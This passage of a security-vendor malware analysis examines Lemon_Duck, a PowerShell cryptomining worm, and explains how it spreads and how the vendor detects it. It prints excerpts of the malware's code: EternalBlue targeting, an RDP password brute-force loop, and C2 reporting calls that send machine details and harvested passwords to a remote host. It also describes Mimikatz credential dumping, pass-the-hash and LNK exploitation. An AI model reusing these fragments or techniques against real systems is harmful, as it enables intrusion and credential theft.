<li>Startup files: The script writes files to startup locations on the Windows filesystem (such as the Start Menu&#8217;s Startup folder) to execute during reboot.</li>
<li>MS-SQL Server brute-forcing &#8211; The script tries a variety of (really bad) passwords that might be used by the SQL Server &#8220;SA&#8221; user account.</li>
<li>Pass the Hash attack &#8211; Leverages the NTLM hashes from the table shown above</li>
<li>Execution of malicious commands on remote machines using WMI</li>
<li>RDP  Bruteforcing</li>
</ul>
<p>In some of these attempted exploits, the script also creates one or more Scheduled Tasks to launch malicious scripts several minutes after the initial compromise. These tricks may be a rudimentary, ham-fisted attempt to evade behaviour-based security products. These types of security tools track the sequence and timing of events to identify attacks in progress and, theoretically, block an attack once a certain threshold of suspicious commands is issued within a short timeframe.</p>
<p>Once new scripts are downloaded from the malicious C&amp;C server, the newer scripts remove the Scheduled Tasks entries created during the initial exploitation. Here are some examples of the propagation methods in use by this threat actor:</p>
<p><strong>EternalBlue: </strong>The attacker&#8217;s scan machines that respond on 445/TCP to see if they are susceptible to the EternalBlue vulnerability using a tool called PingCastle.</p>
<figure id="attachment_60655" aria-describedby="caption-attachment-60655" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/10/ping_castle_scanner.jpg"><img loading="lazy" class="size-full wp-image-60655" src="https://news.sophos.com/wp-content/uploads/2019/10/ping_castle_scanner.jpg" alt="" width="640" height="312" srcset="https://news.sophos.com/wp-content/uploads/2019/10/ping_castle_scanner.jpg 747w, https://news.sophos.com/wp-content/uploads/2019/10/ping_castle_scanner.jpg?resize=300,146 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-60655" class="wp-caption-text">The PingCastle EternalBlue vulnerability scanner</figcaption></figure>
<p>Machines found to be vulnerable to this exploit are then attacked using EternalBlue. The attack script also determines whether the vulnerable machine is running Windows 7 or older, or Windows 8 or newer versions.</p>
<pre>try{
    write-host "start eb scanning..."
    $vul=[PingCastle.Scanners.m17sc]::Scan($currip) // scan for vulnerable IP
    if($vul{{) { }

}
        write-host "$currip seems eb vulnerable..."
        $res = eb7 $currip $sc           //targeting win7 &amp; older version
        if($res) {
            write-host "$currip eb7 got it!!!"
        } else {
            $res = eb8 $currip $sc       //Windows 8, 10 &amp; 2012
            if($res) {
                write-host "$currip eb8 got it!!!"
            }
        }
    }
}catch</pre>
<div class="plain panel" style="border-width: 1px;">
<p>After the attack script determines the version of the attack it will use, it launches the &#8220;SMB Exploitation Module&#8221; shown below.</p>
<figure id="attachment_60657" aria-describedby="caption-attachment-60657" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/10/smb_module.jpg"><img loading="lazy" class="wp-image-60657 size-full" src="https://news.sophos.com/wp-content/uploads/2019/10/smb_module.jpg" alt="" width="640" height="596" srcset="https://news.sophos.com/wp-content/uploads/2019/10/smb_module.jpg 718w, https://news.sophos.com/wp-content/uploads/2019/10/smb_module.jpg?resize=300,280 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-60657" class="wp-caption-text">EtrernalBlue attack code from the Lemon_Duck attack</figcaption></figure>
</div>
<div></div>
<p><strong>LNK Remote Code Execution: </strong>The threat actors behind Lemon_Duck introduced a Windows shortcut *.lnk exploitation component in a recent update. The component exploits the CVE-2017-8464 vulnerability to spread by copying the malicious code to removable USB mass storage devices or network drives.</p>
<p>The script writes both a 32- and 64-bit version of a malicious DLL component, along with with with the corresponding *.lnk files, to the USB or network drive. When the user opens this drive in Windows Explorer or any other application that parses the .lnk Shortcut file, the shortcut executes the malicious DLL component.</p>
<figure id="attachment_60659" aria-describedby="caption-attachment-60659" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/10/usb_spread.jpg"><img loading="lazy" class="wp-image-60659 size-full" src="https://news.sophos.com/wp-content/uploads/2019/10/usb_spread.jpg" alt="" width="640" height="350" srcset="https://news.sophos.com/wp-content/uploads/2019/10/usb_spread.jpg 911w, https://news.sophos.com/wp-content/uploads/2019/10/usb_spread.jpg?resize=300,164 300w, https://news.sophos.com/wp-content/uploads/2019/10/usb_spread.jpg?resize=768,420 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-60659" class="wp-caption-text">The USBLNK component can spread to either FAT32 or NTFS file shares or removable storage devices</figcaption></figure>
<p>The script also creates a file named &#8220;UTFsync inf_data&#8221; &#8211; (file_location) as a reference marker to confirm that the drive is already infected with  *.lnk &amp; *.dll  component. The presence of this file confirms the drive is already infected, so they skip this drive from infecting again.</p>
<p><strong>PassTheHash Attack: </strong>The script verifies the user account privileges. If the user has administrator privileges, then the script invokes Dave Kennedy&#8217;s <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1" target="_blank" rel="noopener noreferrer">PowerDump</a> module and Benjamin Delpy&#8217;s <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener noreferrer">Mimikatz</a> to dump all the NTLM hashes, Username, Password, and domain information. The script later uses those credentials to upload the malicious script files, followed by associated batch or *.lnk file, to the %startup% folder on any remote machines it can access in the network, or execute the PowerShell code remotely using WMI.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2019/10/powerdump_module.jpg"><img loading="lazy" class="alignnone wp-image-60661" src="https://news.sophos.com/wp-content/uploads/2019/10/powerdump_module.jpg" alt="" width="793" height="590" srcset="https://news.sophos.com/wp-content/uploads/2019/10/powerdump_module.jpg 866w, https://news.sophos.com/wp-content/uploads/2019/10/powerdump_module.jpg?resize=300,223 300w, https://news.sophos.com/wp-content/uploads/2019/10/powerdump_module.jpg?resize=768,571 768w" sizes="(max-width: 793px) 100vw, 793px" /></a><strong>PowerDump Module: </strong>This module looks very similar to <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1" target="_blank" rel="noopener noreferrer">an open source script</a> used for penetration testing and features two additional open-source scripting tools.</p>
<p>The malware uses the credentials harvested using Mimikatz to invoke the following PowerShell modules originally published by Kevin Robertson.</p>
<ul>
<li>&#8220;<a href="https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1" target="_blank" rel="noopener noreferrer">Invoke-SE</a>&#8221; &#8211; to execute the malicious batch command in the remote machine.</li>
<li>&#8220;<a href="https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBClient.ps1" target="_blank" rel="noopener noreferrer">Invoke-SMBC</a>&#8221;  &#8211; &#8220;List&#8221; the IPC$ shares of all user, which are maintained by the SMB. It performs three different operations &#8220;List&#8221;, &#8220;Put&#8221; and &#8220;Delete&#8221;.</li>
</ul>
<figure id="attachment_60664" aria-describedby="caption-attachment-60664" style="width: 1143px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/10/pass_hash_copy_run_module.jpg"><img loading="lazy" class="wp-image-60664" src="https://news.sophos.com/wp-content/uploads/2019/10/pass_hash_copy_run_module.jpg" alt="" width="1143" height="696" srcset="https://news.sophos.com/wp-content/uploads/2019/10/pass_hash_copy_run_module.jpg 1407w, https://news.sophos.com/wp-content/uploads/2019/10/pass_hash_copy_run_module.jpg?resize=300,183 300w, https://news.sophos.com/wp-content/uploads/2019/10/pass_hash_copy_run_module.jpg?resize=768,467 768w, https://news.sophos.com/wp-content/uploads/2019/10/pass_hash_copy_run_module.jpg?resize=1024,623 1024w" sizes="(max-width: 1143px) 100vw, 1143px" /></a><figcaption id="caption-attachment-60664" class="wp-caption-text">The malicious script invokes several open-source penetration testing tool PowerShell scripts</figcaption></figure>
<p><strong>MS-SQL server brute-forcing: </strong>The script portscans active IP addresses and enumerates any machine with an open port 1433/TCP, the port used by the Microsoft SQL service, and then engages in a brute-force attack against the &#8220;SA&#8221; user account, using the list of the passwords shown above, along with any password collected locally from the machine using Mimikatz.</p>
<p>Upon a successful compromise of the MS-SQL server account, the script uses the sqlserver.exe process to execute malicious commands against other machines.</p>
<figure id="attachment_60665" aria-describedby="caption-attachment-60665" style="width: 1128px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/10/mssql_bruteforce_module.jpg"><img loading="lazy" class="wp-image-60665" src="https://news.sophos.com/wp-content/uploads/2019/10/mssql_bruteforce_module.jpg" alt="" width="1128" height="423" srcset="https://news.sophos.com/wp-content/uploads/2019/10/mssql_bruteforce_module.jpg 1257w, https://news.sophos.com/wp-content/uploads/2019/10/mssql_bruteforce_module.jpg?resize=300,112 300w, https://news.sophos.com/wp-content/uploads/2019/10/mssql_bruteforce_module.jpg?resize=768,288 768w, https://news.sophos.com/wp-content/uploads/2019/10/mssql_bruteforce_module.jpg?resize=1024,384 1024w" sizes="(max-width: 1128px) 100vw, 1128px" /></a><figcaption id="caption-attachment-60665" class="wp-caption-text">The Lemon_Duck MS-SQL server attack code</figcaption></figure>
<p><strong>RDP brute-forcing:</strong></p>
<p>The RDP module scans for open servers listening on the default RDP port 3389/TCP and will attempt to login with the &#8220;administrator&#8221; user name. The script will cycle through a list of hardcoded passwords using the &#8220;freerdp&#8221; open-source utility.on successful login, the malicious command is executed in the machine.</p>
<pre>foreach($currip in $rdp_portopen[1]) {
			$currip
			if (($old_portopen -notcontains $currip) -and ($currip.length -gt 6)){
				write-host "start rdp scanning..."
				foreach($password in $allpass){
					write-host "Try pass:$password"
					$flag = (new-object RDP.BRUTE).check($exepath,$currip,"administrator",$password,$false)
					if($flag){
						write-host "SUCC!!"
						$brute = new-object RDP.BRUTE
						if($brute.check($exepath,$currip,"administrator",$password,$true)){
							(New-Object Net.WebClient).DownloadString($log_url+'/report.json?type=rdp&amp;ip='+$currip+'&amp;pass='+$password+'&amp;t='+$t)
							[RDP.CMD]::runCmd($rdp_code)
							write-host "Try to run command!!"
						}
						start-sleep 10
						$brute.exit()
						break;
					}
				}
			}
		}</pre>
<div class="plain panel" style="border-width: 1px;">
<figure id="attachment_60671" aria-describedby="caption-attachment-60671" style="width: 1128px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/09/rdp_bruteforce.jpg"><img loading="lazy" class="wp-image-60665" src="https://news.sophos.com/wp-content/uploads/2019/09/rdp_bruteforce.jpg" alt="" width="1128" height="423" /></a><figcaption id="caption-attachment-60671" class="wp-caption-text">RDP Bruteforce Launching code</figcaption></figure>
</div>
<p>&nbsp;</p>
<p>If the machine is been compromised with any of the above methods, the script modifies the Windows Firewall settings to open port 65529/TCP. It uses this indicator as a marker for the malicious script to identify that the machine is already compromised, so it will avoid reusing the exploitation modules on those machines.</p>
<p>This exploitation code runs continuously, with a 5-minute pause, every time it generates a new random IP address list. The script scans for the SMB &amp; MS-SQL services to compromise the new machines. It also builds profiling information about the machine and passes it to its command-and-control server every time it runs this code.</p>
<div class="plain panel" style="border-width: 1px;">
<div class="plain panel" style="border-width: 1px;"><strong>Installation Tracking C2: </strong>This module only runs the first time a machine becomes compromised. This usually happens at the end of the kill chain, after executing all the downloaded modules for local exploitation, lateral movement, and the actual mining script. This module reports the machine profile back to its C2 server along with the status of each executed module.</div>
<pre>write-host "reporting"
	try{
		$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
		$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
		$comp_name = $env:COMPUTERNAME
		$wf = test-path $env:tmp\wfreerdp.exe // RDP utility 
		$mf = test-path $env:tmp\mimi.dat // mimikatz
		(New-Object Net.WebClient).DownloadString($log_url+'/log.json?<ins>V</ins>=0.1&amp;ID='+<ins>$comp_name</ins>+'&amp;GUID='+<ins>$guid</ins>+'&amp;MAC='+<ins>$mac</ins>+'&amp;retry='+<ins>$retry</ins>+'&amp;pc1='+<ins>$portopen[1].count</ins>+'&amp;pc2='+<ins>$ms_portopen[1].count</ins>+'&amp;pc3='+<ins>$old_portopen[1].count</ins>+'&amp;pc4='+<ins>$rdp_portopen[1].count</ins>+'&amp;pci='+<ins>$ipaddrs_i.count</ins>+'&amp;pco='+<ins>$ipaddrs_o.count</ins>+'&amp;pcb='+<ins>$global:ipaddrs_b</ins>+'&amp;mi='+(<ins>$getpasswd</ins> -join "^^")+'&amp;wf='+[Int]<ins>$wf</ins>+'&amp;mf='+[Int]<ins>$mf</ins>)
	    }catch{}
</pre>
<div><strong>Continuous Monitoring C2</strong>: An infected machine will continuously send reports back to the C2 server with the latest status of exploitation and mining modules. This module is executed after all the payload script modules have run. Among the parameters sent back to the C2 server are details about the compromised user accounts, machine configuration, user privilege and exploitation or mining payloads status.</div>
<pre><tt><tt>hxxp://&lt;redacted.com&gt;/report.jsp?ID=HAWKINS-PC&amp;GUID=2D3EC845-35CD-1346-876E-96257ADE6A2F&amp;MAC=&amp;OS=6.1.7601&amp;BIT=32&amp;USER=HAWKINS-PC$&amp;DOMAIN=WORKGROUP&amp;D=&amp;CD=Standard%20VGA%20Graphics%20Adapter&amp;P=1&amp;FI=0&amp;FM=0&amp;IF=0&amp;MF=0&amp;HR=&amp;UP=664.468&amp;_T=1569808438.79244</tt>

Paramaters -
$comp_name = Computername
$guid = machine UUID
$mac = mac address of the machine
$os = installed OS version
$bit = 32 or 64 bit architecture
$user = username
$domain = User Domain
$uptime = system uptime
$card = Installed Graphic Card Name 
$if_ = Exploit &amp; threat progration module 
$mf_ = active 32 or 64 bit mining module
$drive = <tt>removable &amp; network drive information</tt>
$timestamp = Date in <tt>UFormat</tt>
$isA = If AMD Radeon graphic Card Installed &amp; 64 bit machine
<tt>$permit - Is administrator
<tt>FI &amp; <tt><tt><tt>IF</tt></tt></tt> - Confirm the threat propgation module is executed and running active
<tt><tt><tt><tt><tt><tt>FM &amp; </tt></tt></tt>MF - Confirm mining module executed and running active<tt><tt><tt>
<tt>&amp;HR - Miner Hashrate information </tt></tt></tt></tt></tt></tt></tt></tt></tt>
</tt></pre>
<h3>Threat Prevalence</h3>
<p>SophosLabs has monitored this malware communicating with its network and built a database of compromised machines. Based on the compromised machine count in the telemetry, we suspect that the attacks may have originated in Asia, but have spread to every continent.</p>
<figure id="attachment_60669" aria-describedby="caption-attachment-60669" style="width: 745px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/10/threat_heat_map.jpg"><img loading="lazy" class=" wp-image-60669" src="https://news.sophos.com/wp-content/uploads/2019/10/threat_heat_map.jpg" alt="" width="745" height="320" srcset="https://news.sophos.com/wp-content/uploads/2019/10/threat_heat_map.jpg 1222w, https://news.sophos.com/wp-content/uploads/2019/10/threat_heat_map.jpg?resize=300,129 300w, https://news.sophos.com/wp-content/uploads/2019/10/threat_heat_map.jpg?resize=768,330 768w, https://news.sophos.com/wp-content/uploads/2019/10/threat_heat_map.jpg?resize=1024,440 1024w" sizes="(max-width: 745px) 100vw, 745px" /></a><figcaption id="caption-attachment-60669" class="wp-caption-text">Infected machines around the world, geolocated by their IP address</figcaption></figure>
<figure id="attachment_60670" aria-describedby="caption-attachment-60670" style="width: 584px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/10/threat_stats.jpg"><img loading="lazy" class="wp-image-60670 size-full" src="https://news.sophos.com/wp-content/uploads/2019/10/threat_stats.jpg" alt="" width="584" height="533" srcset="https://news.sophos.com/wp-content/uploads/2019/10/threat_stats.jpg 584w, https://news.sophos.com/wp-content/uploads/2019/10/threat_stats.jpg?resize=300,274 300w" sizes="(max-width: 584px) 100vw, 584px" /></a><figcaption id="caption-attachment-60670" class="wp-caption-text">Percentages of the total number of Lemon_Duck infected endpoints, separated by country-code geolocation of the IP addresses</figcaption></figure>
<p>&nbsp;</p>
<h2>Detection Coverage</h2>
<p>Sophos endpoint products will detect elements of the Lemon_Duck PowerShell components using some of the following definitions.</p>
<ul>
<li>HPmal/PowDld-B &#8211; Core Miner Component.</li>
<li>Mal/PshlJob-A &#8211; Old campaign tasks files + Mssql brute-force task files.</li>
<li>Mal/MineJob-C &#8211; task files created by Eternal Blue Exploitation.</li>
<li>Mal/MineJob-B &#8211; Task file persistence.</li>
</ul>
<p>Sophos Managed Threat Response (MTR) detects and neutralizes Techniques, Tactics and Procedures (TTPs) utilized by attackers throughout this report. These include but are not limited to PowerShell executions and download string IEX calls, brute force failed logins, start-up folder and scheduled task persistence, CVE-2017-8464, Open TCP 1433, pass-the-hash, and other malicious techniques.</p>
</div>
			</div><!-- .entry-content -->

</article><!-- #post-## -->

					<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text">Post navigation</h2>
			<div class="nav-links">
	   			<div class="nav-previous">
											<span class="nav-label">Prev</span>
						<a href="https://news.sophos.com/en-us/2019/09/25/fleeceware-apps-overcharge-users-for-basic-app-functionality/" rel="prev">&#039;Fleeceware&#039; apps overcharge users for basic app functionality</a>
						   			</div>
	   			<div class="nav-next">
											<span class="nav-label">Next</span>
						<a href="https://news.sophos.com/en-us/2019/10/01/sophos-launches-managed-threat-response-service/" rel="next">Sophos launches Managed Threat Response service</a>
						   			</div>
		 	</div><!-- .nav-links -->
		</nav><!-- .navigation -->
		
			<div class="article-author-block article-co-authors-block">
	
					<h2 class="author-title">
				About the Authors			</h2>
		
					<div class="author-block-container">
				<div class="author-profile">
					<img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' class='avatar avatar-145 photo' height='145' width='145' />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/rajeshnataraj/" title="Posts by Rajesh Nataraj" class="author url fn" rel="author">Rajesh Nataraj</a></h3>

					
					<div class="author-bio">
											</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
					<div class="author-block-container">
				<div class="author-profile">
					<img alt='' src='https://secure.gravatar.com/avatar/778879ad9924b856f1b4e85ab7cd2019?s=145&#038;d=blank&#038;r=g' class='avatar avatar-145 photo' height='145' width='145' />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/vikas-singh/" title="Posts by Vikas Singh" class="author url fn" rel="author">Vikas Singh</a></h3>

					
					<div class="author-bio">
											</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
					<div class="author-block-container">
				<div class="author-profile">
					<img alt='' src='https://secure.gravatar.com/avatar/1518a10217fd62b4fc9abea1489a4774?s=145&#038;d=blank&#038;r=g' class='avatar avatar-145 photo' height='145' width='145' />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/michael-wood/" title="Posts by Michael Wood" class="author url fn" rel="author">Michael Wood</a></h3>

					
					<div class="author-bio">
											</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
			</div>

			
<div id="comments" class="comments-area">

	
			<h2 class="comments-title">
			<span>1</span> Comment		</h2>

		<section class="comments-list">
		<article class="comment even thread-even depth-1  " id="comment-172287" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Rajan											</h2>
					<time class="comment-meta-item" datetime="2020-01-22T06:57-05:00" itemprop="datePublished"><a href="#comment-172287" itemprop="url">22 January 2020 at 6:57 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thanks guys, well explained.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/?replytocom=172287#respond' data-commentid="172287" data-postid="60589" data-belowelement="comment-172287" data-respondelement="respond" data-replyto="Reply to Rajan" aria-label='Reply to Rajan'>Reply</a>				</div>
			</div>

	</article></section>
		
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='60589' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="be05d1b93d" /></p><input type="hidden" id="ak_js" name="ak_js" value="123"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


<div id="secondary" class="widget-area" role="complementary">
			
		<div id="second-article-wrapper" class="article-wrapper">
			<h3 class="widget-title">You might also enjoy...</h3>
			<article id="post-72266" class="second-featured post-72266 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-security-operations tag-mtr tag-ransomware tag-sidebar tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">03</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/mtr/">MTR</a> &bull; <a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" rel="bookmark">MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72321" class="second-featured post-72321 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-sidebar tag-zero-trust tag-ztna region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2021/02/ZTNA-header.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">02</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/02/sophos-zero-trust-network-access-ztna-is-coming-soon/" rel="bookmark">Sophos zero trust network access (ZTNA) is coming soon</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72021" class="second-featured post-72021 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-mtr tag-rapid-response tag-sidebar tag-sophos-mtr tag-sophos-rapid-response region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v1.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">19</span>
				<span class="month">Jan</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/01/19/451-research-impact-report-on-sophos-rapid-response-service/" rel="bookmark">451 Research Impact Report on Sophos Rapid Response service</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-71626" class="second-featured post-71626 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-edr tag-intercept-x-advanced-for-server-with-edr tag-intercept-x-with-edr tag-live-discover tag-sidebar region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/12/APIs-hero.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">17</span>
				<span class="month">Dec</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/12/17/sophos-edr-live-discover-apis-are-now-generally-available/" rel="bookmark">Sophos EDR Live Discover APIs are now generally available</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
		</div>

	</div> <!-- #secondary -->


		</div> <!-- .container -->
	</div> <!-- #content -->
	<footer>
		<section class="cta">
			<p>Start a Sophos demo in less than a minute. See exactly how our solutions work in a full environment without a commitment.</p>
			<a href="https://secure2.sophos.com/en-us/products/demos.aspx?cmp=70130000001xKqzAAE">Learn More</a>
		</section>
		<section class="connected">
			<div class="social">
				<h3>Stay Connected</h3>
				<ul>
					<li><a href="https://www.facebook.com/securitybysophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/facebook-icon.svg?la=en&amp;hash=1CA0A5A0E9C9999E7E079A5D32C86E9BF9C7AD1E" alt="Facebook"></a>
					</li>
					<li><a href="https://www.instagram.com/sophossecurity/" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/instagram-icon.svg?la=en&amp;hash=2B50C2B67C3023D9E7D4E1C3A16401EAD8F10F76" alt="Instagram"></a>
					</li>
					<li><a href="https://www.linkedin.com/company/sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/linkedin-icon.svg?la=en&amp;hash=B6D5378C1E1A16F239A4C862EAE3499B8EC1F3F9" alt="LinkedIn"></a></li>
					<li><a href="https://www.sophos.com/en-us/company/rss-feeds.aspx"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/rss-icon.svg?la=en&amp;hash=76C4DAFD331DC675814191A66794A778D8C6DCF7" alt="RSS"></a></li>
					<li><a href="https://twitter.com/Sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/twitter-icon.svg?la=en&amp;hash=9A90D9F99ABE6454741BBAAF9C3FB6966624C92D" alt="Twitter"></a></li>
					<li><a href="https://www.youtube.com/user/SophosProducts" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/youtube-icon.svg?la=en&amp;hash=CCCF647AFA78C8DB74D654DB9FEFBF0AC54F42D3" alt="YouTube"></a></li>
				</ul>
			</div>
			<ul class="links">
				<li><a href="https://www.sophos.com/en-us/company/careers.aspx">Careers </a></li>
				<li><a href="https://www.sophos.com/en-us/partners/partner-locator.aspx">Find a Partner</a></li>
				<li><a href="https://secure2.sophos.com/en-us/support.aspx">Support</a></li>
				<li><a href="https://www.sophos.com/en-us/threat-center/technical-papers.aspx">Technical Papers</a></li>
				<li><a href="https://www.sophos.com/en-us/security-news-trends/whitepapers.aspx">Whitepapers</a></li>
			</ul>
		</section>
		<section class="legal">
			<div class="copyright">&copy; 1997 - 2021 Sophos Ltd. All rights reserved</div>
			<ul>
				<li><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookie Information</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx">Modern Slavery Statement</a></li>
			</ul>
		</section>
		<div class="vip" style="background: #002939">
			Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=news.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
